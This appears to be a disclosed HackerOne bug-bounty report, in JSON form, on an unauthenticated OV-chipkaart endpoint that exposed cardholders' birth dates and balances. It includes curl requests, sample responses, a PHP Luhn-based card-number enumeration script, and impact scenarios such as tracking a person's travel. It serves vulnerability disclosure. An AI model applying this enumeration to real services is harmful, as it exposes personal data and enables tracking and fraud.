{"id":408583,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDg1ODM=","url":"https://hackerone.com/reports/408583","title":"Personal data of all Dutch public transport cards (\"OV-Chipkaart\") accessible","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-12-19T20:42:30.000Z","submitted_at":"2017-12-19T20:42:30.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bandjes","url":"/bandjes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/qoUBXy82FrQe9xxBv5jeHkSX/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2124,"url":"https://hackerone.com/ovchipkaart","handle":"ovchipkaart","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/124/c956c1e24afbb410b5e68681884631a25ab5ffb8_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/124/c956c1e24afbb410b5e68681884631a25ab5ffb8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"profile":{"name":"OV-chipkaart","twitter_handle":"ovchipkaart","website":"https://www.ov-chipkaart.nl","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-09-11T22:52:47.136Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"███████████████████████████████","vulnerability_information_html":"\u003cp\u003e███████████████████████████████\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":41,"voters":["kapytein","jobert","michiel","miguel_santareno","sameerphad72","mygf","eveeez","grampae","smelt","mefkan","and 31 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3323668,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-19T20:42:30.000Z","updated_at":"2017-12-19T20:42:30.000Z","actor":{"username":"bandjes","cleared":false,"url":"/bandjes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qoUBXy82FrQe9xxBv5jeHkSX/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bandjes","url":"/bandjes"},"genius_execution_id":null,"team_handle":"ovchipkaart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3324765,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-11T22:52:47.229Z","updated_at":"2018-09-11T22:52:47.229Z","actor":{"username":"bandjes","cleared":false,"url":"/bandjes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qoUBXy82FrQe9xxBv5jeHkSX/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ovchipkaart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3325601,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-12T06:31:13.643Z","updated_at":"2018-09-12T06:31:13.643Z","additional_data":{"old_severity":null,"new_severity":"Medium (5.3)","old_severity_id":null,"new_severity_id":208993},"actor":{"username":"bandjes","cleared":false,"url":"/bandjes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qoUBXy82FrQe9xxBv5jeHkSX/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ovchipkaart","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10472,"category":"researcher","content":"December 19, 2017, an [article on Tweakers.net](https://tweakers.net/nieuws/133081/translink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html) was published about a publicly accessible form showing the balance and the date of last activity of any public transport card you fill in. Short after this article being published a [comment](https://tweakers.net/nieuws/133081/translink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html?showReaction=10937357#r_10937357) on the article stated that the date of birth of the card's owner was also available via the webshop of the Dutch railway company (NS). This was triggering me because it looked like a lot more information than only the balance and last activity date is available via a public accessible endpoint on the web.\n\n##Let's do some digging\nFollowing the information in the article on Tweakers.net, I started looking around on the page where a publicly accessible form is available to check the balance of all cards. Via the network tab in the developer tools, I noticed that each request involves Google reCaptcha to pass. Leaving this HTTP header out resulted in an error message.\n\n```bash\ncurl 'https://www.ov-chipkaart.nl/api/medium/v1/saldocheckerpagedata' \\\n  -H 'Host: www.ov-chipkaart.nl' \\\n  -H 'User-Agent: (...)' \\\n  -H 'Referer: https://www.ov-chipkaart.nl/saldo-terugvragen/saldochecker.htm' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Origin: https://www.ov-chipkaart.nl' \\\n  --data '{\"mediumId\":\"352802080********\"}'\n```\n```json\n{\n  \"errorCode\": 120,\n  \"message\": \"Onjuiste recaptcha token.\"\n}\n```\n\nThis endpoint was not much of use… I decided to log in to my personal account and watch all the network traffic in my developer console while clicking some elements in the dashboard. One of the requests caught my attention: https://www.ov-chipkaart.nl/web/medium_information. This POST request, filled with the parameters `hashedMediumId` and `languagecode`, responded with something I was looking for:\n\n```bash\ncurl 'https://www.ov-chipkaart.nl/web/medium_information' \\\n  -H 'Host: www.ov-chipkaart.nl' \\\n  -H 'User-Agent: (...)' \\\n  -H 'Referer: https://www.ov-chipkaart.nl/mijn-ov-chip/mijn-ov-reishistorie.htm?mediumid=(...)' \\\n  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n  -H 'Origin: https://www.ov-chipkaart.nl' \\\n  -H 'Cookie: (...)' \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  --data 'hashedMediumId=(...)\u0026languagecode=nl-NL'\n```\n```json\n{\n  \"dateOfBirth\": \"01-01-1970\",\n  \"ePurseRemainingAmount\": 13.37,\n  \"expiryDate\": \"01-01-2022\",\n  \"isAutoReloadActive\": false,\n  \"lastActivityTime\": \"01-01-2017 13:37\",\n  \"locale\": \"nl_NL\",\n  \"localeEPurseRemainingAmount\": \"€ 13,37\",\n  \"mediumId\": \"35280208********\",\n  \"mediumStatus\": \"Active\",\n  \"mediumStatusDescription\": \"Actief\",\n  \"mediumType\": \"Anonymous\",\n  \"mediumTypeDescription\": \"Anonieme OV-chipkaart\"\n}\n```\n\nThe only odd thing about this request was the parameter `hashedMediumId`. Where did its content come from and how was it calculated? Unfortunately, I could not find anything about this method in the resources of the page. A dead end. A bit disappointed I looked at the request again and, in a desperate attempt, I replaced the parameter `hashedMediumId` with just `mediumId`. Laughing at the idea this would ever work, I filled in a plain medium ID `35280208********` and pressed the return key and the exact same result came back!\n\n##Let the fun begin\nSo now I found this endpoint I removed the cookie headers used before in my cURL request and tried again. The same result came back, meaning this request could also be used without authentication to retrieve data from all possible card numbers out there.\n\n\nIn order to confirm this, I made myself a list of possible card numbers, all starting with `35280200`. To rule out a lot of numbers, I checked the validation algorithm behind the OV-Chipkaart. Finding this algorithm wasn’t that hard since the JavaScript validation method in the forms was called `luhnCheck`. So the algorithm used is the *Luhn algorithm*, a modulo 10 check, also used with e.g. IMEI numbers and credit card numbers. To generate this list I created the following PHP snippet:\n\n```php\n\u003c?php\n\nfunction luhnCheck($number) {\n    $number = (string) $number;\n    $l = strlen($number);\n    $n = $o = 0;\n    $r = [\n        [0,1,2,3,4,5,6,7,8,9],\n        [0,2,4,6,8,1,3,5,7,9],\n    ];\n\n    for ($t = $l; $t--; ) {\n        $o += $r[$n][(int) $number{$t}];\n        $n ^= 1;\n    }\n\n    return $o % 10 === 0 \u0026\u0026 $o \u003e 0;\n}\n\n$fh = fopen(__DIR__ . DIRECTORY_SEPARATOR . 'numbers.txt', 'a+');\n$prefix = 35280200;\n\nfor ($i = 0; $i \u003c 100000000; $i++) {\n    $number = sprintf('%d%08d', $prefix, $i);\n\n    if (luhnCheck($number)) {\n        fwrite($fh, $number . PHP_EOL);\n    }\n}\n\nfclose($fh);\n\n```\n\nIt resulted in a file of 170 MB with 10 million card numbers. Next I picked 5 random numbers;\n\n```bash\nrl -c 5 numbers.txt\n```\n\n… and tried them all of them with the endpoint. All requests were successful and returned the same data structure as I received with my own card number.\n\n##Impact\nThe impact of this publicly accessible endpoint is huge. I will give three scenarios, but there are a lot more use cases for what you could do with this data.\n\n1. Querying the data of one specific OV-Chipkaart for every minute over a period of a month would give me a good insight into the daily schedule of its user. Calculating the difference of the card’s balance each time I query the data can give me an indication of where the user lives and traveling to since the fares for each route are pretty specific.\n2. Fetching the data of all possible card numbers gives me a nice insight into the average user. I could make charts of the average age of all users. The average balance of all users. The average card type. The total amount of money still available on cards.\n3. Using this form would give me the opportunity to reclaim the balance (max. € 20,-) of anonymous cards expired less than a year ago.\n","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eDecember 19, 2017, an \u003ca href=\"/redirect?url=https%3A%2F%2Ftweakers.net%2Fnieuws%2F133081%2Ftranslink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003earticle on Tweakers.net\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e was published about a publicly accessible form showing the balance and the date of last activity of any public transport card you fill in. Short after this article being published a \u003ca href=\"/redirect?url=https%3A%2F%2Ftweakers.net%2Fnieuws%2F133081%2Ftranslink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html%3FshowReaction%3D10937357%23r_10937357\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ecomment\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on the article stated that the date of birth of the card\u0026#39;s owner was also available via the webshop of the Dutch railway company (NS). This was triggering me because it looked like a lot more information than only the balance and last activity date is available via a public accessible endpoint on the web.\u003c/p\u003e\n\n\u003ch2 id=\"let-s-do-some-digging\"\u003eLet\u0026#39;s do some digging\u003c/h2\u003e\n\n\u003cp\u003eFollowing the information in the article on Tweakers.net, I started looking around on the page where a publicly accessible form is available to check the balance of all cards. Via the network tab in the developer tools, I noticed that each request involves Google reCaptcha to pass. Leaving this HTTP header out resulted in an error message.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;https://www.ov-chipkaart.nl/api/medium/v1/saldocheckerpagedata\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Host: www.ov-chipkaart.nl\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;User-Agent: (...)\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Referer: https://www.ov-chipkaart.nl/saldo-terugvragen/saldochecker.htm\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type: application/json\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Origin: https://www.ov-chipkaart.nl\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026quot;mediumId\u0026quot;:\u0026quot;352802080********\u0026quot;}\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;errorCode\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e120\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Onjuiste recaptcha token.\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis endpoint was not much of use… I decided to log in to my personal account and watch all the network traffic in my developer console while clicking some elements in the dashboard. One of the requests caught my attention: \u003ca title=\"https://www.ov-chipkaart.nl/web/medium_information\" href=\"/redirect?url=https%3A%2F%2Fwww.ov-chipkaart.nl%2Fweb%2Fmedium_information\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.ov-chipkaart.nl/web/medium_information\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This POST request, filled with the parameters \u003ccode\u003ehashedMediumId\u003c/code\u003e and \u003ccode\u003elanguagecode\u003c/code\u003e, responded with something I was looking for:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;https://www.ov-chipkaart.nl/web/medium_information\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Host: www.ov-chipkaart.nl\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;User-Agent: (...)\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Referer: https://www.ov-chipkaart.nl/mijn-ov-chip/mijn-ov-reishistorie.htm?mediumid=(...)\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Origin: https://www.ov-chipkaart.nl\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Cookie: (...)\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;X-Requested-With: XMLHttpRequest\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;hashedMediumId=(...)\u0026amp;languagecode=nl-NL\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;dateOfBirth\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;01-01-1970\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;ePurseRemainingAmount\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mf\"\u003e13.37\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;expiryDate\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;01-01-2022\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;isAutoReloadActive\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;lastActivityTime\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;01-01-2017 13:37\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;locale\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;nl_NL\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;localeEPurseRemainingAmount\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;€ 13,37\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;mediumId\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;35280208********\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;mediumStatus\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Active\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;mediumStatusDescription\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Actief\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;mediumType\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Anonymous\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;mediumTypeDescription\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Anonieme OV-chipkaart\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe only odd thing about this request was the parameter \u003ccode\u003ehashedMediumId\u003c/code\u003e. Where did its content come from and how was it calculated? Unfortunately, I could not find anything about this method in the resources of the page. A dead end. A bit disappointed I looked at the request again and, in a desperate attempt, I replaced the parameter \u003ccode\u003ehashedMediumId\u003c/code\u003e with just \u003ccode\u003emediumId\u003c/code\u003e. Laughing at the idea this would ever work, I filled in a plain medium ID \u003ccode\u003e35280208********\u003c/code\u003e and pressed the return key and the exact same result came back!\u003c/p\u003e\n\n\u003ch2 id=\"let-the-fun-begin\"\u003eLet the fun begin\u003c/h2\u003e\n\n\u003cp\u003eSo now I found this endpoint I removed the cookie headers used before in my cURL request and tried again. The same result came back, meaning this request could also be used without authentication to retrieve data from all possible card numbers out there.\u003c/p\u003e\n\n\u003cp\u003eIn order to confirm this, I made myself a list of possible card numbers, all starting with \u003ccode\u003e35280200\u003c/code\u003e. To rule out a lot of numbers, I checked the validation algorithm behind the OV-Chipkaart. Finding this algorithm wasn’t that hard since the JavaScript validation method in the forms was called \u003ccode\u003eluhnCheck\u003c/code\u003e. So the algorithm used is the \u003cem\u003eLuhn algorithm\u003c/em\u003e, a modulo 10 check, also used with e.g. IMEI numbers and credit card numbers. To generate this list I created the following PHP snippet:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eluhnCheck\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$number\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$number\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003e$number\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$l\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$number\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$n\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$o\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$r\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$t\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$l\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$o\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$r\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$n\u003c/span\u003e\u003cspan class=\"p\"\u003e][(\u003c/span\u003e\u003cspan class=\"nx\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003e$number\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\u003cspan class=\"p\"\u003e}];\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$n\u003c/span\u003e \u003cspan class=\"o\"\u003e^=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    